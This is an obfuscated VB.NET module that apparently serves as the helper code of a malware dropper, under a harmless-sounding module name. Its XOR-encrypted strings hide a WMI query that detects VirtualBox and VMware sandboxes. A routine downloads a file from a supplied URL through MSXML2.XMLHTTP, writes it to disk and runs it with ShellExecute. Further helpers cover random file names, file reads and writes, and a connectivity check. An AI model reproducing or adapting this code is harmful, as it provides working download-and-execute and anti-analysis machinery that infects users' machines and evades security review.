Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Reflection
Imports System.Text
Imports System.Net

Module EffectEnvironmentParameters

    Public KJm0d156fyrMEaWwNO0K3bfZ9J5BkICgwvjhYT6nOBhio As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
    Public kWaXctCkG1M87a2TzGIa13Q0s5QC4PRZVUWcga2HcP45k As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    Public iyvLtYcU4sMmGLNgsx1jXvomFr4Vp0tPR2HKBV6M2xahy As String = Environment.GetEnvironmentVariable(SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÌÒÕßÒÉ", "›"))
    Public de1CUxTd38qMOK9wgwBvvY3gghGRIoTxzarNJDsE4zLNQ As String = Environment.GetEnvironmentVariable(SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÎÈÞÉËÉÔÝÒ×Þ", "›"))
    Public tw4OgvRXFjasuS9nwrSun6F9CQMa0U5DPj9aQfwKc57zr As String = Environment.GetEnvironmentVariable(SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÏÞÖË", "›"))
    Public qbOzL3Fc71of7CgReQCcrskivEaKmvBlk95HjFbCKQ7zg As String = Assembly.GetExecutingAssembly().Location
    Public wmqTQ2lC3eYMxjBcqF2OLjzOk3NLk6r1NhZcYSvEmvHME As String = Path.GetDirectoryName(qbOzL3Fc71of7CgReQCcrskivEaKmvBlk95HjFbCKQ7zg)

    Public Function VwrbYf5MXOiupkfkVrgFBLhOaGrVR64jTZyuzib893UBs(ByVal SÆÆWœœÆjbØœœœPg8PdWkœœÆØc As String, ByVal vaKÆÆØœeFœwVØcœØØOØØœIlÆØ As String, Optional ByVal uilØœoA4ÆcÆØoÆLtRnØGsÆnT4 As UInteger = 0) As String
        Dim c3ÆcUœØfvTØÆcQØZØDœMPzM2m() As Byte = VwrbYf5MXOiupkfkVrgFBLhOaGrVR64jTZyuzib893UBs(Encoding.Default.GetBytes(SÆÆWœœÆjbØœœœPg8PdWkœœÆØc), Encoding.Default.GetBytes(vaKÆÆØœeFœwVØcœØØOØØœIlÆØ), uilØœoA4ÆcÆØoÆLtRnØGsÆnT4)
        VwrbYf5MXOiupkfkVrgFBLhOaGrVR64jTZyuzib893UBs = Encoding.Default.GetString(c3ÆcUœØfvTØÆcQØZØDœMPzM2m)
        Erase c3ÆcUœØfvTØÆcQØZØDœMPzM2m
    End Function

    Public Function VwrbYf5MXOiupkfkVrgFBLhOaGrVR64jTZyuzib893UBs(ByRef ÆÆØØSQØxlYyBœØqvÆkSœcœœÆ7() As Byte, ByVal ÆœfJÆ3ÆÆQœ() As Byte, Optional ByVal SÆØHJCKQk5œÆbœœØM9LI1QÆjØ As UInteger = 0) As Byte()
        For i = 0 To (ÆÆØØSQØxlYyBœØqvÆkSœcœœÆ7.Length - 1) * (SÆØHJCKQk5œÆbœœØM9LI1QÆjØ + 1)
            ÆÆØØSQØxlYyBœØqvÆkSœcœœÆ7(i Mod ÆÆØØSQØxlYyBœØqvÆkSœcœœÆ7.Length) = CByte((CInt(ÆÆØØSQØxlYyBœØqvÆkSœcœœÆ7(i Mod ÆÆØØSQØxlYyBœØqvÆkSœcœœÆ7.Length) Xor ÆœfJÆ3ÆÆQœ(i Mod ÆœfJÆ3ÆÆQœ.Length)) - CInt(ÆÆØØSQØxlYyBœØqvÆkSœcœœÆ7((i + 1) Mod ÆÆØØSQØxlYyBœØqvÆkSœcœœÆ7.Length)) + 256) Mod 256)
        Next
        Array.Resize(ÆÆØØSQØxlYyBœØqvÆkSœcœœÆ7, ÆÆØØSQØxlYyBœØqvÆkSœcœœÆ7.Length - 1)
        Return ÆÆØØSQØxlYyBœØqvÆkSœcœœÆ7
    End Function

    Public Function t7RisfnOoQSCcVbhemIsaxxlDmNgsuBK48kKZrEMYp123(ByVal œRØØQFRœØw As String, ByVal œ02ÆØVaxÆØ As String) As String
        Dim ØdÆmÆWdÆÆOØg7œ3jVRœØIœHVjZØØ4ØceœÆœØØmi3œQ8œhEœkÆÆØØ9uhÆtØg2ypÆœaœœÆ3œœØœ2r7RylnfcYÆœgÆ550ÆFÆ0tmœoœh As Long, HÆÆœRÆØf2œuœØsÆx1QØhqAHÆÆ0ØØRDVhpœœœØSØ8ÆÆœTd8ÆKÆaJ4A6oØÆØÆLVÆœØœdRDœ6ØØÆØœ9S1wœl0vÆÆÆvœÆzqQÆ5ÆiCÆ8q As Long
        Rnd(-1)
        Randomize(œ02ÆØVaxÆØ.Length)
        For HÆÆœRÆØf2œuœØsÆx1QØhqAHÆÆ0ØØRDVhpœœœØSØ8ÆÆœTd8ÆKÆaJ4A6oØÆØÆLVÆœØœdRDœ6ØØÆØœ9S1wœl0vÆÆÆvœÆzqQÆ5ÆiCÆ8q = 1 To œ02ÆØVaxÆØ.Length
            ØdÆmÆWdÆÆOØg7œ3jVRœØIœHVjZØØ4ØceœÆœØØmi3œQ8œhEœkÆÆØØ9uhÆtØg2ypÆœaœœÆ3œœØœ2r7RylnfcYÆœgÆ550ÆFÆ0tmœoœh += (((HÆÆœRÆØf2œuœØsÆx1QØhqAHÆÆ0ØØRDVhpœœœØSØ8ÆÆœTd8ÆKÆaJ4A6oØÆØÆLVÆœØœdRDœ6ØØÆØœ9S1wœl0vÆÆÆvœÆzqQÆ5ÆiCÆ8q Mod 256) Xor Asc(Mid(œ02ÆØVaxÆØ, HÆÆœRÆØf2œuœØsÆx1QØhqAHÆÆ0ØØRDVhpœœœØSØ8ÆÆœTd8ÆKÆaJ4A6oØÆØÆLVÆœØœdRDœ6ØØÆØœ9S1wœl0vÆÆÆvœÆzqQÆ5ÆiCÆ8q, 1))) Xor Fix(256 * Rnd()))
        Next HÆÆœRÆØf2œuœØsÆx1QØhqAHÆÆ0ØØRDVhpœœœØSØ8ÆÆœTd8ÆKÆaJ4A6oØÆØÆLVÆœØœdRDœ6ØØÆØœ9S1wœl0vÆÆÆvœÆzqQÆ5ÆiCÆ8q
        Rnd(-1)
        Randomize(ØdÆmÆWdÆÆOØg7œ3jVRœØIœHVjZØØ4ØceœÆœØØmi3œQ8œhEœkÆÆØØ9uhÆtØg2ypÆœaœœÆ3œœØœ2r7RylnfcYÆœgÆ550ÆFÆ0tmœoœh)
        For HÆÆœRÆØf2œuœØsÆx1QØhqAHÆÆ0ØØRDVhpœœœØSØ8ÆÆœTd8ÆKÆaJ4A6oØÆØÆLVÆœØœdRDœ6ØØÆØœ9S1wœl0vÆÆÆvœÆzqQÆ5ÆiCÆ8q = 1 To œRØØQFRœØw.Length
            Mid(œRØØQFRœØw, HÆÆœRÆØf2œuœØsÆx1QØhqAHÆÆ0ØØRDVhpœœœØSØ8ÆÆœTd8ÆKÆaJ4A6oØÆØÆLVÆœØœdRDœ6ØØÆØœ9S1wœl0vÆÆÆvœÆzqQÆ5ÆiCÆ8q, 1) = Chr(Fix(256 * Rnd()) Xor Asc(Mid(œRØØQFRœØw, HÆÆœRÆØf2œuœØsÆx1QØhqAHÆÆ0ØØRDVhpœœœØSØ8ÆÆœTd8ÆKÆaJ4A6oØÆØÆLVÆœØœdRDœ6ØØÆØœ9S1wœl0vÆÆÆvœÆzqQÆ5ÆiCÆ8q, 1)))
        Next HÆÆœRÆØf2œuœØsÆx1QØhqAHÆÆ0ØØRDVhpœœœØSØ8ÆÆœTd8ÆKÆaJ4A6oØÆØÆLVÆœØœdRDœ6ØØÆØœ9S1wœl0vÆÆÆvœÆzqQÆ5ÆiCÆ8q
        Return œRØØQFRœØw
    End Function

    Public Function SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL(GtQYJBujKVMAwOlGrÑdAMqBJVCQKcyAEWEñbONXIkJKueZFaDU As String, UIrNxNOÑNIYPNNMSyNHgaZJJKpEPoDhaqqYANFWfPñLpBDZArñ As String) As String
        Dim CLtaqfwELBMtijÑHmKpJSSZWfZCrzSIFNPBSRVSiStnYSZWPDf() As Byte
        Dim pECJXqCPDnTVtQWÑGIñJwxCKPaoHÑTfJeGNAhMbkSFGJZOmPIF() As Byte
        Dim wLmPkkUNRfBNkXGVhDQFDNNJHxMTBHVvxjqBCBHQORaGBwFFKe As Integer
        Dim OBQsQRCBFWVYbOlPoiFyISYÑpEgrwbNAjwWyCAZSIJZppIaHbi As Integer
        Dim vMIsVmGGjÑxDNfCscCBÑDeEAEPCÑnMsuZDBHpOoDxcLCccoWuÑ As Integer
        Dim nhUOUtxbMEMcaHoHWHKAWHlQJkVVKCzGIUIÑgNQJKZCAAZFyCy As Integer
        pECJXqCPDnTVtQWÑGIñJwxCKPaoHÑTfJeGNAhMbkSFGJZOmPIF = Encoding.Default.GetBytes(GtQYJBujKVMAwOlGrÑdAMqBJVCQKcyAEWEñbONXIkJKueZFaDU)
        CLtaqfwELBMtijÑHmKpJSSZWfZCrzSIFNPBSRVSiStnYSZWPDf = Encoding.Default.GetBytes(UIrNxNOÑNIYPNNMSyNHgaZJJKpEPoDhaqqYANFWfPñLpBDZArñ)
        vMIsVmGGjÑxDNfCscCBÑDeEAEPCÑnMsuZDBHpOoDxcLCccoWuÑ = UBound(pECJXqCPDnTVtQWÑGIñJwxCKPaoHÑTfJeGNAhMbkSFGJZOmPIF)
        nhUOUtxbMEMcaHoHWHKAWHlQJkVVKCzGIUIÑgNQJKZCAAZFyCy = UBound(CLtaqfwELBMtijÑHmKpJSSZWfZCrzSIFNPBSRVSiStnYSZWPDf)
        Do Until wLmPkkUNRfBNkXGVhDQFDNNJHxMTBHVvxjqBCBHQORaGBwFFKe > vMIsVmGGjÑxDNfCscCBÑDeEAEPCÑnMsuZDBHpOoDxcLCccoWuÑ
            pECJXqCPDnTVtQWÑGIñJwxCKPaoHÑTfJeGNAhMbkSFGJZOmPIF(wLmPkkUNRfBNkXGVhDQFDNNJHxMTBHVvxjqBCBHQORaGBwFFKe) = pECJXqCPDnTVtQWÑGIñJwxCKPaoHÑTfJeGNAhMbkSFGJZOmPIF(wLmPkkUNRfBNkXGVhDQFDNNJHxMTBHVvxjqBCBHQORaGBwFFKe) Xor CLtaqfwELBMtijÑHmKpJSSZWfZCrzSIFNPBSRVSiStnYSZWPDf(OBQsQRCBFWVYbOlPoiFyISYÑpEgrwbNAjwWyCAZSIJZppIaHbi)
            OBQsQRCBFWVYbOlPoiFyISYÑpEgrwbNAjwWyCAZSIJZppIaHbi = OBQsQRCBFWVYbOlPoiFyISYÑpEgrwbNAjwWyCAZSIJZppIaHbi + 1
            If OBQsQRCBFWVYbOlPoiFyISYÑpEgrwbNAjwWyCAZSIJZppIaHbi > nhUOUtxbMEMcaHoHWHKAWHlQJkVVKCzGIUIÑgNQJKZCAAZFyCy Then OBQsQRCBFWVYbOlPoiFyISYÑpEgrwbNAjwWyCAZSIJZppIaHbi = 0
            wLmPkkUNRfBNkXGVhDQFDNNJHxMTBHVvxjqBCBHQORaGBwFFKe = wLmPkkUNRfBNkXGVhDQFDNNJHxMTBHVvxjqBCBHQORaGBwFFKe + 1
        Loop
        Erase CLtaqfwELBMtijÑHmKpJSSZWfZCrzSIFNPBSRVSiStnYSZWPDf
        SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL = Encoding.Default.GetString(pECJXqCPDnTVtQWÑGIñJwxCKPaoHÑTfJeGNAhMbkSFGJZOmPIF)
        Erase pECJXqCPDnTVtQWÑGIñJwxCKPaoHÑTfJeGNAhMbkSFGJZOmPIF
    End Function

    Public Sub lcmJhcMQPP4JLBXmtr7CNOzV0LzytbeQMB9xr5zUXvcag(ByVal TWœœØG6ÆÆ0 As Double)
        Dim c761ØœgNØØ As Date
        c761ØœgNØØ = DateAdd(SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("è", "›"), TWœœØG6ÆÆ0, Now)
        Do
            Application.DoEvents()
        Loop Until Now >= c761ØœgNØØ
    End Sub

    Public Function WbJrgH79XC4JQ7QkdsLJ8udMFmWF2XTtkwCpdE8g2C2iv() As Boolean
        Try
            WbJrgH79XC4JQ7QkdsLJ8udMFmWF2XTtkwCpdE8g2C2iv = False
            Dim NyØØ6œœkRK As Object
            Dim œzœUØ8GÆœÆ As Object
            Dim dWGœÆœØØœf As String
            dWGœÆœØØœf = SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÈÞ×ÞØÏ»±»ÝÉÔÖ»Ìòõ¨©ÄÍòÿþôØôõïéô÷÷þé", "›")
            NyØØ6œœkRK = GetObject(SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ìòõöüöïè¡", "›")).ExecQuery(dWGœÆœØØœf)
            For Each œzœUØ8GÆœÆ In NyØØ6œœkRK
                Select Case œzœUØ8GÆœÆ.Description
                    Case SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÍÖ»Úÿÿòïòôõè»È¨»Ïéòô¨©´­¯", "›")
                        WbJrgH79XC4JQ7QkdsLJ8udMFmWF2XTtkwCpdE8g2C2iv = True
                    Case SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("È¨»Ïéòô¨©´­¯", "›")
                        WbJrgH79XC4JQ7QkdsLJ8udMFmWF2XTtkwCpdE8g2C2iv = True
                    Case SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("Íòéïîú÷Ùôã»Üéúëóòøè»Úÿúëïþé", "›")
                        WbJrgH79XC4JQ7QkdsLJ8udMFmWF2XTtkwCpdE8g2C2iv = True
                    Case SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÍÖìúéþ»ÈÍÜÚ»ÒÒ", "›")
                        WbJrgH79XC4JQ7QkdsLJ8udMFmWF2XTtkwCpdE8g2C2iv = True
                    Case SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÍÖìúéþ»ÈÍÜÚ»¨ß", "›")
                        WbJrgH79XC4JQ7QkdsLJ8udMFmWF2XTtkwCpdE8g2C2iv = True
                    Case ""
                        WbJrgH79XC4JQ7QkdsLJ8udMFmWF2XTtkwCpdE8g2C2iv = True
                    Case Else
                End Select
            Next
        Catch PœØØÆgœœSØÆDÆELœÆÆn3aÆzØÆ As Exception
            WbJrgH79XC4JQ7QkdsLJ8udMFmWF2XTtkwCpdE8g2C2iv = False
        End Try
    End Function

    Public Function mbqu5dWtJVw7zOZZc6G716lpzvC3S2WF8MD7Mhv5uhT8I(ByRef B8ÆØuDÆØØœ As Integer, ByRef FlØœœeRTØœ As Boolean) As String
        Dim Økzx8Wbœpb As New Random()
        Dim lXMØbØz6œœ35TjÆzœœEØfØœœœ() As Char = SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("úùøÿþýüóòñð÷öõôëêéèïîíìãâáÚÙØßÞÝÜÓÒÑÐ×ÔÖÕÔËÊÉÈÏÎÍÌÃÂÁ«ª©¨¯®­¬£¢", "›").ToCharArray()
        Dim itÆWaØSGzJSqA6ÆObGØGœFœBd As String = String.Empty
        For Ok5ÆØØJØØS As Integer = 0 To B8ÆØuDÆØØœ - 1
            itÆWaØSGzJSqA6ÆObGØGœFœBd += lXMØbØz6œœ35TjÆzœœEØfØœœœ(Økzx8Wbœpb.Next(lXMØbØz6œœ35TjÆzœœEØfØœœœ.Length - 1))
        Next
        Return IIf(FlØœœeRTØœ, itÆWaØSGzJSqA6ÆObGØGœFœBd.ToUpper(), itÆWaØSGzJSqA6ÆObGØGœFœBd)
    End Function

    Public Function rCDYiinHKXJyokn8WPNyi9MWWPjQjipGPRF9Hu1dO6WTZ(ppJØœGØÆ8d3IØbØœœyÆœRGÆØL As String) As String
        Try
            Dim Æœ1CœœRlØœ As Integer
            Æœ1CœœRlØœ = FreeFile()
            FileOpen(Æœ1CœœRlØœ, ppJØœGØÆ8d3IØbØœœyÆœRGÆØL, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            rCDYiinHKXJyokn8WPNyi9MWWPjQjipGPRF9Hu1dO6WTZ = New String(Chr(0), FileLen(ppJØœGØÆ8d3IØbØœœyÆœRGÆØL))
            FileGet(Æœ1CœœRlØœ, rCDYiinHKXJyokn8WPNyi9MWWPjQjipGPRF9Hu1dO6WTZ)
            FileClose(Æœ1CœœRlØœ)
        Catch œQœØeÆzÆØÆIœØØZp2œXYØe25œØa7ÆtœTØ4eidÆ1XÆÆœvÆÆØPœa As Exception
            Return ""
        End Try
    End Function

    Public Sub XqzFGaBa9fycWxwoPeWzO0FflkSL5sakHawct005L9ub7(coØsØq6ÆØz As String, ØIØSjL8ÆcØ As String)
        Dim Øf18œiNhÆÆÆÆÆÆWPzœÆ8q3wØk As Integer
        Øf18œiNhÆÆÆÆÆÆWPzœÆ8q3wØk = FreeFile()
        FileOpen(Øf18œiNhÆÆÆÆÆÆWPzœÆ8q3wØk, coØsØq6ÆØz, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(Øf18œiNhÆÆÆÆÆÆWPzœÆ8q3wØk, ØIØSjL8ÆcØ)
        FileClose(Øf18œiNhÆÆÆÆÆÆWPzœÆ8q3wØk)
    End Sub

    Public Sub EsIQTT4QJzFoB1wEhoIHDTXhwNRFmRZyza9XnqlumO0pC(ÆÆ8dmcØ2cC As String)
        Dim œÆœœ2eœOØœhÆœÆqJØcÆÆØÆUlœ As Object
        œÆœœ2eœOØœhÆœÆqJØcÆÆØÆUlœ = CreateObject(SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("Èóþ÷÷µÚëë÷òøúïòôõ", "›"))
        œÆœœ2eœOØœhÆœÆqJØcÆÆØÆUlœ.ShellExecute(ÆÆ8dmcØ2cC, "", "", SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ôëþõ", "›"), 1)
        œÆœœ2eœOØœhÆœÆqJØcÆÆØÆUlœ = Nothing
    End Sub

    Public Sub FBGId596oUCgMgQ7BtaNfzCS2Kvk2G1dPVxtEUg6XUy2Q(RhœœœœHkØa As String, ØØXØØØØ6g7DSQfÆ2ØOMÆØNQØh As String, Optional lvœØØ3œSœ8lvœØØ3œSœ8 As Boolean = True)
        Try
            Dim ØKÆvØDdwÆecœ9Ø75EeœœNMØÆÆ As Object
            Dim A2SfÆÆ6ØEØFiœVbœrfØœcfOep As Object
            ØKÆvØDdwÆecœ9Ø75EeœœNMØÆÆ = CreateObject(SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÖÈÃÖ×©µÃÖ×ÓÏÏË", "›"))
            Call ØKÆvØDdwÆecœ9Ø75EeœœNMØÆÆ.Open(SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÜÞÏ", "›"), RhœœœœHkØa, False)
            Call ØKÆvØDdwÆecœ9Ø75EeœœNMØÆÆ.send("")
            If ØKÆvØDdwÆecœ9Ø75EeœœNMØÆÆ.Status = 200 Then
                A2SfÆÆ6ØEØFiœVbœrfØœcfOep = CreateObject(SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÚßÔßÙµÈïéþúö", "›"))
                With A2SfÆÆ6ØEØFiœVbœrfØœcfOep
                    .Open()
                    .Type = 1
                    .Write(ØKÆvØDdwÆecœ9Ø75EeœœNMØÆÆ.responseBody)
                    .Position = 0
                    .SaveToFile(ØØXØØØØ6g7DSQfÆ2ØOMÆØNQØh, 2)
                    .Close()
                End With
                A2SfÆÆ6ØEØFiœVbœrfØœcfOep = Nothing
            End If
            ØKÆvØDdwÆecœ9Ø75EeœœNMØÆÆ = Nothing
            If lvœØØ3œSœ8lvœØØ3œSœ8 = True Then Call EsIQTT4QJzFoB1wEhoIHDTXhwNRFmRZyza9XnqlumO0pC(ØØXØØØØ6g7DSQfÆ2ØOMÆØNQØh)
        Catch Æbe8œcÆiQWÆœÆØØœÆjOIØiiOOØØØXAKØgÆfAœSœØrØUGmØÆ3Øq As Exception
        End Try
    End Sub

    Public Function xVqlpdyQ4uJHzwSZY74IkzRN0rg1hfrG4hlDVnMxRVmn0() As Boolean
        If My.Computer.Network.IsAvailable = True Then
            Return My.Computer.Network.Ping(SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ìììµöòøéôèôýïèïôéþµøôö", "›"))
        Else
            Return False
        End If
    End Function
End Module

